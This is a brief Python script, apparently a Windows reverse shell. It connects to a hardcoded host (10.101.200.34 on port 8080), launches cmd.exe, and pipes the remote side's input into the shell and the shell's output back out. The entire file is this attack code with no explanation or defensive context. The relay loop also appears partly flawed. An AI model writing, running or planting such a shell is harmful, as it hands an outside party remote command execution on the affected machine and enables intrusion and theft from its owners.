import os,socket,subprocess,threading;

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.101.200.34",8080))

p = subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

#p.wait()
while True:
    data = s.recv(1024)
    if len(data) > 0:
        p.stdin.write(data)
    for line in p.stdout:
        s.send(line)
#    r = p.stdout.read()
#    s.send(r)
         
